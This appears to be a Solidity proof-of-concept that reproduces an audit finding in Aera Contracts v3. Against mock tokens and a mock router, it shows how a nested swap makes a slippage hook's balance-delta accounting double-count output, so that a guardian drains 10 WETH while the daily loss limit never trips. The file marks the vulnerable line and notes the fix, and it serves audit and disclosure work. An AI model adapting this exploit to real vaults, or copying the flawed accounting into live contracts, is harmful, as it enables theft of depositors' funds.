// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Aera Contracts v3 — Incorrect calculation of the received swap amount
    allows guardians to bypass the daily loss limit (Spearbit, finding #58289)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The vulnerable
    balance-delta computation from BaseSlippageHooks (`actualAmountOut =
    IERC20(tokenOut).balanceOf(vault) - balanceBefore`, blamed at
    BaseSlippageHooks.sol#L118-119 and #L132-133) is inlined VERBATIM and
    @>-marked. No fork, no cheatcodes, no real Uniswap — the double-count
    mechanism is real: a nested "good" swap credits the SAME tokenOut balance
    that the outer "bad" swap's after-hook reads, so a near-total-loss trade
    passes the daily-loss check and the guardian drains the vault.
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Aera Contracts v3 — BaseSlippageHooks balance-delta double-count
    Finding 58289 (Spearbit / Gauntlet review, Slowfi) — HIGH

    Root cause: the after-swap slippage hook derives the amount received from
    a swap as the DELTA of the vault's tokenOut balance between the before-hook
    and the after-hook. That delta is not attributable to a single swap: if a
    SECOND swap runs during the first (via a callback) and also increases the
    tokenOut balance, the first swap's after-hook double-counts that increase.

    A guardian exploits this to submit an economically near-worthless swap
    (10 WETH -> ~0 DAI) whose after-hook nonetheless records ~zero loss, so the
    per-day loss limit never trips. The 10 WETH input is siphoned into an
    attacker-controlled sink — a real, token-denominated drain of vault funds.

    This file is a self-contained reduction. The vulnerable balance-delta line
    is preserved VERBATIM and @>-marked; the recommended fix (value the loss
    from the swap's own input parameters, never a shared balance delta) is shown
    as an adjacent comment. The mock DEX/router models controllable swap output
    and a mid-swap callback so the double-count is mechanically genuine.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal 18-decimal ERC20 (WETH / DAI stand-ins).
contract MockERC20 {
    string public name;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name) {
        name = _name;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

/// @notice The mid-swap callback the malicious swap fires (the guardian's hook).
interface ISwapCallback {
    function onSwapCallback() external;
}

/// @notice Reduction of Aera's BaseSlippageHooks. The before-hook caches the
///         vault's tokenOut balance; the after-hook derives the "received"
///         amount as the balance DELTA and accumulates the daily loss against
///         a per-day limit. Loss is valued in the numeraire (DAI): a WETH->DAI
///         swap loses `value(amountIn) - value(actualAmountOut)`.
contract SlippageHook {
    // fair value of tokenIn (WETH) expressed in tokenOut (DAI) units
    uint256 public immutable fairRate;
    // maximum cumulative loss tolerated per day, in numeraire (DAI) units
    uint256 public immutable dailyLossLimit;

    // per-vault, per-swap cached tokenOut balance (models the hook's transient
    // storage slot; a distinct slot per swap so nested swaps do not collide)
    mapping(address => mapping(uint256 => uint256)) public balanceBefore;
    // per-vault accumulated daily loss
    mapping(address => uint256) public cumulativeDailyLoss;

    constructor(uint256 _fairRate, uint256 _dailyLossLimit) {
        fairRate = _fairRate;
        dailyLossLimit = _dailyLossLimit;
    }

    /// @notice Before-hook: cache the vault's tokenOut balance in this swap's slot.
    function beforeSwap(uint256 swapId, address tokenOut) external {
        // BaseSlippageHooks caches tokenOut balance before the swap executes.
        balanceBefore[msg.sender][swapId] = IERC20(tokenOut).balanceOf(msg.sender);
    }

    /// @notice After-hook: derive the received amount, accumulate the loss, and
    ///         enforce the daily loss limit.
    function afterSwap(uint256 swapId, address, /*tokenIn*/ address tokenOut, uint256 amountIn) external {
        address vault = msg.sender;

        // FIX: derive the received amount from the swap's own return value /
        //      input parameters (e.g. params.amountOutMinimum) — never from a
        //      shared balance delta that a nested swap can inflate.
        uint256 actualAmountOut = IERC20(tokenOut).balanceOf(vault) - balanceBefore[vault][swapId]; // @> VULN: balance-delta double-counts a nested swap's output (BaseSlippageHooks.sol#L118-119,#L132-133)

        // value both legs in the numeraire (DAI); loss is floored at zero
        uint256 valueIn = amountIn * fairRate;
        uint256 valueOut = actualAmountOut;
        uint256 loss = valueIn > valueOut ? valueIn - valueOut : 0;

        cumulativeDailyLoss[vault] += loss;
        require(cumulativeDailyLoss[vault] <= dailyLossLimit, "ExceedsDailyLoss");
    }
}

/// @notice Mock DEX router. `swapGood` is a fair WETH->DAI trade. `swapBad`
///         siphons the input WETH to an attacker sink for ~0 DAI, and — while
///         executing — fires a callback so a nested `swapGood` can run and
///         inflate the vault's DAI balance mid-swap.
contract MockRouter {
    MockERC20 public immutable weth;
    MockERC20 public immutable dai;
    address public immutable attackerSink; // where bad-swap WETH is captured

    uint256 public constant FAIR_RATE = 2000; // 1 WETH = 2000 DAI (fair)
    uint256 public constant BAD_DAI_OUT = 1 ether; // near-total loss on a bad swap

    address public swapCallback;
    bool public callbackArmed;

    constructor(MockERC20 _weth, MockERC20 _dai, address _attackerSink) {
        weth = _weth;
        dai = _dai;
        attackerSink = _attackerSink;
    }

    function armCallback(address cb) external {
        swapCallback = cb;
        callbackArmed = true;
    }

    /// @notice Fair swap: pull `amountIn` WETH from the vault, pay fair DAI.
    function swapGood(address vault, uint256 amountIn) external returns (uint256 out) {
        weth.transferFrom(vault, address(this), amountIn); // WETH stays in the fair pool
        out = amountIn * FAIR_RATE;
        dai.transfer(vault, out);
    }

    /// @notice Malicious swap: siphon the vault's WETH to the attacker sink,
    ///         fire the mid-swap callback (runs the nested good swap), then pay
    ///         only a dust amount of DAI back to the vault.
    function swapBad(address vault, uint256 amountIn) external returns (uint256 out) {
        weth.transferFrom(vault, attackerSink, amountIn); // input captured by attacker
        if (callbackArmed) {
            callbackArmed = false;
            ISwapCallback(swapCallback).onSwapCallback(); // nested good swap inflates vault DAI
        }
        out = BAD_DAI_OUT;
        dai.transfer(vault, out);
    }
}

/// @notice Reduction of Aera's guardian-operated vault. `submit` runs a single
///         swap wrapped by the slippage hook's before/after callbacks. There is
///         no reentrancy lock, so a mid-swap callback can nest another submit
///         (the two swaps use distinct hook slots and do not collide) — exactly
///         the condition the finding requires.
contract Vault {
    MockERC20 public immutable weth;
    MockERC20 public immutable dai;
    MockRouter public immutable router;
    SlippageHook public immutable hook;
    address public immutable guardian;

    uint256 public swapNonce;

    constructor(MockERC20 _weth, MockERC20 _dai, MockRouter _router, SlippageHook _hook, address _guardian) {
        weth = _weth;
        dai = _dai;
        router = _router;
        hook = _hook;
        guardian = _guardian;
    }

    /// @notice Guardian submits one WETH->DAI swap (bad = high-slippage route).
    function submit(bool bad, uint256 amountIn) external {
        require(msg.sender == guardian, "NotGuardian");

        uint256 id = ++swapNonce;
        hook.beforeSwap(id, address(dai)); // tokenOut = DAI

        weth.approve(address(router), amountIn);
        if (bad) {
            router.swapBad(address(this), amountIn);
        } else {
            router.swapGood(address(this), amountIn);
        }

        hook.afterSwap(id, address(weth), address(dai), amountIn);
    }
}

/// @dev Attacker-controlled sink that keeps the WETH siphoned by the bad swap.
contract AttackerSink {}

/// @notice The guardian/orchestrator. Deploys the whole system, funds a vault
///         with 20 WETH, then submits a bad swap whose mid-swap callback nests a
///         fair swap so the bad swap's after-hook double-counts and records ~0
///         loss — bypassing the daily loss limit and draining the vault's WETH.
contract Exploit is ISwapCallback {
    uint256 public constant SWAP_AMOUNT = 10 ether; // each swap moves 10 WETH
    uint256 public constant FAIR_RATE = 2000; // 1 WETH = 2000 DAI
    uint256 public constant DAILY_LOSS_LIMIT = 1000 ether; // 1000 DAI/day tolerance
    uint256 public constant BAD_DAI_OUT = 1 ether; // dust DAI returned by bad swap

    MockERC20 public weth;
    MockERC20 public dai;
    AttackerSink public attackerSink;
    MockRouter public router;
    SlippageHook public hook;
    Vault public vault;
    address public attacker;

    constructor() {
        attacker = msg.sender;

        // DEPLOY ORDER (CREATE nonces):
        weth = new MockERC20("WETH"); // nonce 1
        dai = new MockERC20("DAI"); // nonce 2
        attackerSink = new AttackerSink(); // nonce 3
        router = new MockRouter(weth, dai, address(attackerSink)); // nonce 4
        hook = new SlippageHook(FAIR_RATE, DAILY_LOSS_LIMIT); // nonce 5
        vault = new Vault(weth, dai, router, hook, address(this)); // nonce 6 (guardian = this)

        // Fund: vault holds 20 WETH; router (DEX) holds ample DAI liquidity.
        weth.mint(address(vault), 20 ether);
        dai.mint(address(router), 30000 ether);
    }

    /// @notice Router fires this mid-bad-swap; we nest a FAIR swap so the vault's
    ///         DAI balance rises while the outer bad swap's balanceBefore was
    ///         already cached at zero. msg.sender here is the guardian (this).
    function onSwapCallback() external {
        vault.submit(false, SWAP_AMOUNT); // nested good swap: 10 WETH -> 20000 DAI
    }

    function run() external {
        // Arm the router to call back into us during the bad swap.
        router.armCallback(address(this));

        // === attack: submit a bad swap; its callback nests a good swap ===
        // Outer before-hook caches DAI balance = 0. During the bad swap the
        // nested good swap credits 20000 DAI. The bad swap then pays 1 DAI dust.
        // Outer after-hook reads 20001 - 0 = 20001 DAI "received" for a 10 WETH
        // input worth 20000 DAI -> recorded loss = 0, limit never trips.
        vault.submit(true, SWAP_AMOUNT);

        // ---- HARM (asserted; run() must complete without reverting) ----

        // (1) FUND DRAIN: the vault's 10 WETH from the bad swap was siphoned to
        //     the attacker-controlled sink for ~nothing.
        require(weth.balanceOf(address(attackerSink)) == SWAP_AMOUNT, "no extraction");
        require(weth.balanceOf(address(vault)) == 0, "vault WETH not drained");

        // (2) LIMIT BYPASSED: the hook recorded ~0 loss though the bad trade's
        //     true economic loss (10 WETH -> 1 DAI) is ~19999 DAI, which far
        //     exceeds the 1000 DAI daily limit. A correct accounting would have
        //     reverted the submit; here it succeeded.
        uint256 recordedLoss = hook.cumulativeDailyLoss(address(vault));
        uint256 trueLoss = SWAP_AMOUNT * FAIR_RATE - BAD_DAI_OUT; // 20000 - 1 = 19999 DAI
        require(recordedLoss == 0, "loss should be under-reported to ~0");
        require(trueLoss > DAILY_LOSS_LIMIT, "true loss should exceed the daily limit");
        require(recordedLoss <= DAILY_LOSS_LIMIT, "recorded loss must pass the daily check");
        require(recordedLoss + DAILY_LOSS_LIMIT < trueLoss, "bypass margin not wide");
    }
}
